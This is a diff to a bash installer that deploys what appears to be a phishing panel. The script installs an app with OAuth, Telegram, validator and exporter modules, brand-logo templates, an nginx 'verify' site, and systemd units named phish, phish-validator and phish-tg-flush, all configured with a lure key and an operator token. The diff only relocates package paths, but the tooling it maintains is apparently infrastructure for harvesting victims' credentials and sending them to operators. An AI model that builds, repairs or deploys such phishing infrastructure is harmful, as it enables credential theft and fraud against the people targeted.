@@ -21,7 +21,7 @@ preflight() {
   [ -n "${OPERATOR_TOKEN:-}" ] || err "preflight" "OPERATOR_TOKEN not set"
   [ -n "${LURE_KEY:-}" ]       || err "preflight" "LURE_KEY not set"
   [ -d "$PKG_DIR" ]            || err "preflight" "package dir missing"
-  [ -d "$PKG_DIR/panel" ]      || err "preflight" "panel dir missing"
+  [ -f "$PKG_DIR/app.py" ]     || err "preflight" "app.py missing in $PKG_DIR"
   ok "preflight"
 }
 
@@ -37,18 +37,18 @@ panel_only() {
   ok "panel-only: backup"
 
   step "panel-only: replace files"
-  install -m 0644 "$PKG_DIR/panel/app.py"                "$PANEL_DIR/app.py"
-  install -m 0644 "$PKG_DIR/panel/db.py"                 "$PANEL_DIR/db.py"
-  install -m 0644 "$PKG_DIR/panel/oauth.py"              "$PANEL_DIR/oauth.py"
-  install -m 0644 "$PKG_DIR/panel/telegram.py"           "$PANEL_DIR/telegram.py"
-  install -m 0644 "$PKG_DIR/panel/worker.py"             "$PANEL_DIR/worker.py"
-  install -m 0644 "$PKG_DIR/panel/validator.py"          "$PANEL_DIR/validator.py"
-  install -m 0644 "$PKG_DIR/panel/exporter.py"           "$PANEL_DIR/exporter.py"
-  install -m 0644 "$PKG_DIR/panel/templates_registry.py" "$PANEL_DIR/templates_registry.py"
+  install -m 0644 "$PKG_DIR/app.py"                "$PANEL_DIR/app.py"
+  install -m 0644 "$PKG_DIR/db.py"                 "$PANEL_DIR/db.py"
+  install -m 0644 "$PKG_DIR/oauth.py"              "$PANEL_DIR/oauth.py"
+  install -m 0644 "$PKG_DIR/telegram.py"           "$PANEL_DIR/telegram.py"
+  install -m 0644 "$PKG_DIR/worker.py"             "$PANEL_DIR/worker.py"
+  install -m 0644 "$PKG_DIR/validator.py"          "$PANEL_DIR/validator.py"
+  install -m 0644 "$PKG_DIR/exporter.py"           "$PANEL_DIR/exporter.py"
+  install -m 0644 "$PKG_DIR/templates_registry.py" "$PANEL_DIR/templates_registry.py"
   mkdir -p "$PANEL_DIR/static/logos"
-  install -m 0644 "$PKG_DIR/panel/static/app.js"       "$PANEL_DIR/static/app.js"
-  install -m 0644 "$PKG_DIR/panel/static/style.css"    "$PANEL_DIR/static/style.css"
-  install -m 0644 "$PKG_DIR/panel/static/logos/"*.svg  "$PANEL_DIR/static/logos/"
+  install -m 0644 "$PKG_DIR/static/app.js"       "$PANEL_DIR/static/app.js"
+  install -m 0644 "$PKG_DIR/static/style.css"    "$PANEL_DIR/static/style.css"
+  install -m 0644 "$PKG_DIR/static/logos/"*.svg  "$PANEL_DIR/static/logos/"
   ok "panel-only: replace files"
 
   step "panel-only: restart"
@@ -108,17 +108,17 @@ install_venv() {
 
 install_panel_files() {
   step "panel files"
-  install -m 0644 "$PKG_DIR/panel/app.py"                "$PANEL_DIR/app.py"
-  install -m 0644 "$PKG_DIR/panel/db.py"                 "$PANEL_DIR/db.py"
-  install -m 0644 "$PKG_DIR/panel/oauth.py"              "$PANEL_DIR/oauth.py"
-  install -m 0644 "$PKG_DIR/panel/telegram.py"           "$PANEL_DIR/telegram.py"
-  install -m 0644 "$PKG_DIR/panel/worker.py"             "$PANEL_DIR/worker.py"
-  install -m 0644 "$PKG_DIR/panel/validator.py"          "$PANEL_DIR/validator.py"
-  install -m 0644 "$PKG_DIR/panel/exporter.py"           "$PANEL_DIR/exporter.py"
-  install -m 0644 "$PKG_DIR/panel/templates_registry.py" "$PANEL_DIR/templates_registry.py"
-  install -m 0644 "$PKG_DIR/panel/static/app.js"       "$PANEL_DIR/static/app.js"
-  install -m 0644 "$PKG_DIR/panel/static/style.css"    "$PANEL_DIR/static/style.css"
-  install -m 0644 "$PKG_DIR/panel/static/logos/"*.svg  "$PANEL_DIR/static/logos/"
+  install -m 0644 "$PKG_DIR/app.py"                "$PANEL_DIR/app.py"
+  install -m 0644 "$PKG_DIR/db.py"                 "$PANEL_DIR/db.py"
+  install -m 0644 "$PKG_DIR/oauth.py"              "$PANEL_DIR/oauth.py"
+  install -m 0644 "$PKG_DIR/telegram.py"           "$PANEL_DIR/telegram.py"
+  install -m 0644 "$PKG_DIR/worker.py"             "$PANEL_DIR/worker.py"
+  install -m 0644 "$PKG_DIR/validator.py"          "$PANEL_DIR/validator.py"
+  install -m 0644 "$PKG_DIR/exporter.py"           "$PANEL_DIR/exporter.py"
+  install -m 0644 "$PKG_DIR/templates_registry.py" "$PANEL_DIR/templates_registry.py"
+  install -m 0644 "$PKG_DIR/static/app.js"       "$PANEL_DIR/static/app.js"
+  install -m 0644 "$PKG_DIR/static/style.css"    "$PANEL_DIR/static/style.css"
+  install -m 0644 "$PKG_DIR/static/logos/"*.svg  "$PANEL_DIR/static/logos/"
   ok "panel files"
 }
 
@@ -128,7 +128,7 @@ render_config() {
     -e "s|@@DOMAIN@@|$DOMAIN|g" \
     -e "s|@@OPERATOR_TOKEN@@|$OPERATOR_TOKEN|g" \
     -e "s|@@LURE_KEY@@|$LURE_KEY|g" \
-    "$PKG_DIR/panel/config.template.py" > "$PANEL_DIR/config.py"
+    "$PKG_DIR/config.template.py" > "$PANEL_DIR/config.py"
   chmod 0644 "$PANEL_DIR/config.py"
   ok "config"
 }
@@ -148,7 +148,7 @@ install_cf_credentials() {
 install_nginx() {
   step "nginx"
   sed -e "s|@@DOMAIN@@|$DOMAIN|g" \
-      "$PKG_DIR/panel/nginx/verify.conf" > "$NGINX_SITE"
+      "$PKG_DIR/nginx/verify.conf" > "$NGINX_SITE"
   ln -sf "$NGINX_SITE" /etc/nginx/sites-enabled/verify
   rm -f /etc/nginx/sites-enabled/default
   nginx -t >/dev/null 2>&1 || err "nginx" "config test failed"
@@ -178,11 +178,11 @@ HOOK
 
 install_systemd() {
   step "systemd"
-  install -m 0644 "$PKG_DIR/panel/systemd/phish.service"           "$SYSTEMD_DIR/phish.service"
-  install -m 0644 "$PKG_DIR/panel/systemd/phish-validator.service" "$SYSTEMD_DIR/phish-validator.service"
-  install -m 0644 "$PKG_DIR/panel/systemd/phish-validator.timer"   "$SYSTEMD_DIR/phish-validator.timer"
-  install -m 0644 "$PKG_DIR/panel/systemd/phish-tg-flush.service"  "$SYSTEMD_DIR/phish-tg-flush.service"
-  install -m 0644 "$PKG_DIR/panel/systemd/phish-tg-flush.timer"    "$SYSTEMD_DIR/phish-tg-flush.timer"
+  install -m 0644 "$PKG_DIR/systemd/phish.service"           "$SYSTEMD_DIR/phish.service"
+  install -m 0644 "$PKG_DIR/systemd/phish-validator.service" "$SYSTEMD_DIR/phish-validator.service"
+  install -m 0644 "$PKG_DIR/systemd/phish-validator.timer"   "$SYSTEMD_DIR/phish-validator.timer"
+  install -m 0644 "$PKG_DIR/systemd/phish-tg-flush.service"  "$SYSTEMD_DIR/phish-tg-flush.service"
+  install -m 0644 "$PKG_DIR/systemd/phish-tg-flush.timer"    "$SYSTEMD_DIR/phish-tg-flush.timer"
   systemctl daemon-reload
   systemctl enable --now phish
   systemctl enable --now phish-validator.timer
